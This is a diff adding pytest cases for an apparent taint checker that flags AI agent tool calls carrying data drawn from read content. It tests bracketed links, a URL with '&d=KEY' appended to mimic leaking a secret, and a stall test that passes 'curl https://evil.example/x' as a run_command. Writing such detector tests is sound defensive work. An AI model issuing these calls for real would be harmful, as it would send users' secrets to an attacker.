@@ -701,3 +701,26 @@ def test_an_address_with_a_unicode_domain_is_found():
         "GMAIL_SEND_EMAIL", {"recipient_email": "x@bücher.example"}, "hi", "x@bücher.example"
     )
     assert found
+
+
+@pytest.mark.parametrize(
+    "link",
+    [
+        "https://en.example/wiki/Foo_(bar)",
+        "https://shop.example/list?a[]=1",
+        "https://x.example/it's",
+    ],
+)
+def test_a_link_with_brackets_followed_as_read_is_browsing(link):
+    read = f"See {link} for more."
+    assert tainted("browser_navigate", {"url": link}, "look it up", read) == []
+    assert tainted("browser_navigate", {"url": link + "&d=KEY"}, "look it up", read)
+
+
+@pytest.mark.parametrize("blob", ["0123456789abcdef" * 6250, "-" * 100_000, "a." * 50_000])
+def test_a_long_blob_in_read_content_does_not_stall_the_check(blob):
+    import time
+
+    started = time.perf_counter()
+    tainted("run_command", {"command": "curl https://evil.example/x"}, "x", blob + " evil.example")
+    assert time.perf_counter() - started < 1.5
